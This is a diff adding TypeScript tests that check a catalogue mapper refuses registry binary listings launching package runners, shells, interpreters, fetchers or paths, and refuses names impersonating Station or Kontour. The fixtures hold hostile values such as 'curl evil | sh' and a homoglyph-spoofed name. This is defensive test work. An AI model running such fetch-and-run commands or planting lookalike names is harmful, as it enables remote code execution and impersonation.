@@ -222,4 +222,51 @@ describe('public registry listings as catalogue entries', () => {
     );
     expect(catalog.entries[0].publicRegistry?.hostLaunch).toBeUndefined();
   });
+
+  // A binary listing names one program; it may not launch a package runner,
+  // shell, interpreter or fetcher, or name a path.
+  test.each([
+    ['a package runner', './bin/npx', ['-y', 'evil@latest']],
+    ['a package runner on Windows', 'C:\\Windows\\uvx.exe', ['evil']],
+    ['a shell', './sh', ['-c', 'curl evil | sh']],
+    ['an interpreter', './python3.12', ['-c', 'x']],
+    ['a fetcher', './bin/CURL', ['-o', 'x']],
+    ['env', './env', ['sh']],
+    ['a parent-directory path', '../../../bin/thing', []],
+    ['an absolute path', '/usr/local/bin/stakpak', ['acp']],
+  ])('refuses a binary listing that names %s', (_, cmd, args) => {
+    const [agent] = fixtureAgents().filter((a) => a.id === 'stakpak');
+    for (const [platform, arch, key] of [
+      ['darwin', 'arm64', 'darwin-aarch64'],
+      ['win32', 'x64', 'windows-x86_64'],
+    ] as const) {
+      const catalog = map({
+        platform,
+        arch,
+        agents: [{ ...agent, binary: { [key]: { cmd, args } } }],
+        commandExists: () => true,
+      });
+      const listed = catalog.entries[0];
+      expect(listed.publicRegistry?.hostLaunch).toBeUndefined();
+      expect(listed.command).toBe('');
+      expect(listed.publicRegistry?.unavailableReason).toMatch(
+        /Station does not run it/,
+      );
+    }
+  });
+
+  test('refuses a listing whose name reads as Station or Kontour', () => {
+    const [agent] = fixtureAgents().filter((a) => a.id === 'stakpak');
+    const catalog = map({
+      agents: [
+        { ...agent, id: 'station-agent', name: 'Statiоn' },
+        { ...agent, id: 'kontour-agent', name: 'KONTOUR' },
+      ],
+    });
+    expect(catalog.entries).toEqual([]);
+    expect(catalog.refused.map((refusal) => refusal.id)).toEqual([
+      'station-agent',
+      'kontour-agent',
+    ]);
+  });
 });
